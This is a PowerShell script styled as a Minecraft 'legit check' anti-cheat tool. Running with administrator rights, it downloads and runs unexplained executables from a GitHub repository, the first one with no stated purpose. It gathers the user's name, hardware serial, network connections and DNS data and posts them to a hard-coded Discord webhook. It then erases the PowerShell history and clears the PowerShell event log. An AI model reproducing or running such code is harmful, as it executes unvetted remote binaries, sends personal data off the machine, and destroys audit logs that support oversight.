Clear-Host

Add-Type -AssemblyName System.IO.Compression.FileSystem

function Write-Logo {
    $color = "Magenta"

    Write-Host ""
    Write-Host ""
    Write-Host "       :::        ::::::::::       ::::::::       :::::::::::   :::::::::::        ::::::::       :::    :::       ::::::::::       ::::::::       :::    :::" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "     :+:        :+:             :+:    :+:          :+:           :+:           :+:    :+:      :+:    :+:       :+:             :+:    :+:      :+:   :+:" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "    +:+        +:+             +:+                 +:+           +:+           +:+             +:+    +:+       +:+             +:+             +:+  +:+:" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "   +#+        +#++:++#        :#:                 +#+           +#+           +#+             +#++:++#++       +#++:++#        +#+             +#++:++" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host "  +#+        +#+             +#+   +#+#          +#+           +#+           +#+             +#+    +#+       +#+             +#+             +#+  +#+" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host " #+#        #+#             #+#    #+#          #+#           #+#           #+#    #+#      #+#    #+#       #+#             #+#    #+#      #+#   #+#" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host "########## ##########       ########       ###########       ###            ########       ###    ###       ##########       ########       ###    ###" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host ""
    Write-Host ""
    Write-Host ""
}

function Send-Webhook-Data() {
    param($Payload)

    $webhookUrl = "https://discord.com/api/webhooks/1430163604883243069/o8pNeSj-qVF5ROqFNqoac6kK3BsVgC7RvLU2KvczeNZfS03108GQM5kapCV4OE2YukRm"

    $body = $Payload | ConvertTo-Json -Depth 5

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8"
}

Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/0.exe" -OutFile "1.exe"
Start-Process -FilePath "1.exe" -Wait
if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }

Write-Logo

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Права администратора не обнаружены" -ForegroundColor Yellow
    exit 1
}


#Stage 1

#$obsProcess = Get-Process -Name "obs64", "obs32", "obs", "ayugram", "telegram", "nvcontainer", "gamebar", "steam", "discord", "lively", "chrome", "opera", "msedge"
#if ($obsProcess) { $obsProcess | Stop-Process -Force }

$username = "None"
$data = Get-Date -Format "dd.MM.yyyy HH:mm"

$connections = @(netstat -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] | Select-Object -First 1 })
$dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
$usn_deletes = @(try { Get-WinEvent -FilterXml "<QueryList><Query Id='0' Path='Microsoft-Windows-Ntfs/Operational'><Select Path='Microsoft-Windows-Ntfs/Operational'>*[System[EventID=501]] and *[EventData[Data[@Name='ProcessName'] and (Data='fsutil.exe')]]</Select></Query></QueryList>" -ErrorAction Stop | ForEach-Object { $_.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") } } catch { @() })
$javawDlls = @(Get-Process javaw -ErrorAction SilentlyContinue | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -like "*.dll" -and -not $_.FileVersionInfo.FileDescription -and $_.FileName -notmatch "\\(natives|Temp)\\" } | Where-Object { (Get-AuthenticodeSignature $_.FileName).Status -ne 'Valid' } | Select-Object -ExpandProperty FileName)
$baritoneDirs = @()
$injgen = ""
$versionJar = ""
$isCheatVersion = ""
$vmBrand = ""


#InjGen
Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/1.exe" -OutFile "1.exe"
Invoke-Expression ".\1.exe > tTttT"

if (Test-Path "tTttT") { 
    foreach($i in Get-Content -Path "tTttT") {
        if($i.Contains("Injection detected in")) {
            $injgen = "Detected"
        }
    }
} 
if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }


#WMIC_Data_Get
$commandLine = Get-CimInstance Win32_Process -Filter "name='javaw.exe'" | Select-Object -ExpandProperty CommandLine
    
if ($commandLine) {
    if ($commandLine -match '--username') {
        $username = (($commandLine -split "--username ")[1] -split " ")[0]
    }
    if($commandLine -match '-Djava.library.path=') {
        $versionPath = (((($commandLine -split "-Djava.library.path=")[1] -split '"')[0] -split " -D")[0] -split "\\natives")[0]
        $versionJar = (Get-ChildItem -Path $versionPath -Recurse -Filter *.jar -File | Sort-Object Length -Descending |  Select-Object -First 1).FullName
        $isSoft = [System.IO.Compression.ZipFile]::OpenRead($versionJar).Entries | Where-Object { $_.FullName.Contains("baritone")  }
        if($isSoft) { $isCheatVersion = "True" }
    } 
}


Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/2.exe" -OutFile "1.exe"

#Search baritoen folders
$driveLetters = @(Get-Volume | Where-Object {$_.DriveLetter} | ForEach-Object {$_.DriveLetter})
$commandLine = @()

foreach($i in $driveLetters) {
    $commandLine += ./1.exe search $i -f cache --dir-only 
}

if($commandLine) {
    foreach($i in $commandLine -split "\n") {
        if($i.Contains("Path") -and $i.Contains("funtime")) { 
            $baritoneDirs += ($i -split " : ")[1].trim()
        }
    }
}

if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }


#VM Check
Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/3.exe" -OutFile "1.exe"
$commandLine = ./1.exe | Out-String

foreach ($i in $commandLine -split "`n") {
    if ($i -match "VM brand:") {
        $clean = $i -replace "[`u001B`\x1B]\[[0-9;]*[A-Za-z]", ""
        $clean = $clean -replace "[^ -~]", "" 
        $res = ($clean -split "VM brand:")[1].Trim() 
        if(-not $res.Contains("Unknown")) {
            $vmBrand = $res
        }
    }
}

if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }




$embeds = @()

if ($injgen) { $embeds += @{ 
        title = "InjGen detected" 
        color = 16711680
    }
}

if ($connections) { $embeds += @{ 
        title = "Connections" 
        description = $connections
        color = 16776960
    }
} else {
    $embeds += @{ 
        title = "Connections" 
        description = "None"
        color = 16711680
    }
}

if ($dnsData) { $embeds += @{ 
        title = "DNS Info" 
        description = ($dnsData -join "`n")
        color = 16776960
    }
} else {
    $embeds += @{ 
            title = "DNS Info" 
            description = "None"
            color = 16711680
    }
}

if ($vmBrand) { $embeds += @{ 
        title = "VM detected" 
        description = $vmBrand
        color = 16711680
    }
}

if ($isCheatVersion) { $embeds += @{ 
        title = "Cheat Version Detected" 
        description = $versionJar
        color = 16711680
    }
}
if (-not $versionJar) { $embeds += @{ 
        title = "ERROR! Version File Not Found" 
        color = 255
    }
}

if($baritoneDirs) { $embeds += @{ 
        title = "Baritone Dirs Detected" 
        description = ($baritoneDirs -join "`n")
        color = 16711680
    }
}
if ($javawDlls) { $embeds += @{ 
        title = "Suspicious dlls detected" 
        description = ($javawDlls -join "`n")
        color = 16711680
    }
}
if ($usn_deletes) { $embeds += @{ 
        title = "USN Deleted" 
        description = ($usn_deletes -join "`n")
        color = 16711680
    }
}



$payload = @{
content = 
"
# Ник: $username  Дата: $data HWID: $((Get-WmiObject -Class Win32_BIOS).SerialNumber)
"
}
$payload.embeds = $embeds

Send-Webhook-Data -Payload $payload

$filePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $filePath) { Clear-Content -Path $filePath -Force }

wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"

